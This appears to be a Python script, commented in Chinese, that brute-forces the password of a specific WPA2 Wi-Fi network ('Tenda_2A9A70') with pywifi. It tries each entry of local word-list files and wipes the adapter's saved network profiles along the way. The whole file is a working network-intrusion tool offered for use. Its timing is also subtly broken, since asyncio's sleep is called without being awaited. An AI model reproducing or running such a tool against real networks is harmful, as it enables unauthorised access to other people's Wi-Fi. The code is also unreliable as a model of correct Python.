# -*- coding: utf-8 -*-
# author: laugc
# email: hahalgc@gmail.com
# time: 2019/8/16 21:38
# file: py99_pywifi.py

import time
import pywifi
from pywifi import const
from asyncio.tasks import sleep
import os

"""
破解 wifi 密码
"""


class CrackWifiPassword():
    def __init__(self, path):
        self.file = open(path, 'r', errors='ignore')
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个网卡
        self.iface.disconnect()  # 测试连接断开所有连接
        time.sleep(0.1)  # 休眠 1 秒
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 测试网卡是否属于断开状态

    def crack_password(self):
        print('开始破解 wifi 密码。')
        while True:
            try:
                my_str = self.file.readline()
                if not my_str:
                    break
                c = self.test_connect(my_str)
                if c:
                    print('bingo, 密码准确：', my_str)
                    break
                else:
                    print('密码错误：' + my_str)
                sleep(3)
            except:
                continue

    def test_connect(self, find_str):  # 测试连接
        profile = pywifi.Profile()  # 创建 wifi 连接文件
        profile.ssid = 'Tenda_2A9A70'  # wifi 名称
        profile.auth = const.AUTH_ALG_OPEN  # 开发的网卡
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi 加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = find_str  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的 wifi 文件
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)  # 连接
        sleep(0.1)
        if self.iface.status() == const.IFACE_CONNECTED:  # 是否连接上
            connected = True
        else:
            connected = False
        self.iface.disconnect()  # 断开连接
        time.sleep(0.1)
        # 检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return connected

    def __del__(self):
        self.file.close()


p = 'C:\\Users\\Administrator\\Desktop\\字典密码'
files = os.listdir(p)
print(files)

for file in files:
    path = p + '\\' + file  # 密码字典
    start = CrackWifiPassword(path)
    start.crack_password()
